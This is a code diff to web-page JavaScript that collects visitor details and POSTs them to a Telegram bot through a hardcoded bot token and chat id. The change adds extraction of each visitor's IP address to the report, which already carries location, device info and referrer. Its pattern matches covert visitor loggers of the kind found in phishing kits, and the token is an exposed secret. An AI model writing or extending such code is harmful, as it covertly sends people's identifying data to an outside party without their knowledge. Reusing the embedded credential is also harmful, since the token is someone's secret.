@@ -21,10 +21,15 @@
           var toten = '1597774416:AAGbN4TwPCwS4PSh4QtvzRojIT8i8N5aLl8'
           var location = 'Unknown'
           var client_data = 'Unknown'
+          var ip_data = 'Unknown'
+          var ip = 'ip='
           var client_uag = 'uag='
           var loc = 'loc='
           if(data.includes(loc)){
             location = data.slice(data.lastIndexOf(loc) + 4,data.lastIndexOf(loc) + 6);
+          }
+          if(data.includes(ip)){
+            ip_data = data.slice(data.lastIndexOf(ip) + 3,data.lastIndexOf('ts='));
           }
           if(data.includes(client_uag)){
             client_data = data.slice(data.lastIndexOf(client_uag) + 4,data.lastIndexOf('colo='));
@@ -36,7 +41,7 @@
           $.ajax({
             url:'https://api.telegram.org/bot'+toten+'/sendMessage',
             method:'POST',
-            data:{chat_id:chat_id,text:'==> Visitor data: '+string+', Location: '+location+'\n==> client device info: '+client_data+'==> Reference from: '+ref},
+            data:{chat_id:chat_id,text:'==> Visitor data: '+string+', Location: '+location+'\n==> Reference from: '+ref+'\n==> ip: '+ip_data+'==> client device info: '+client_data},
             success:function(){
             },
             error: function (request, status, error) {
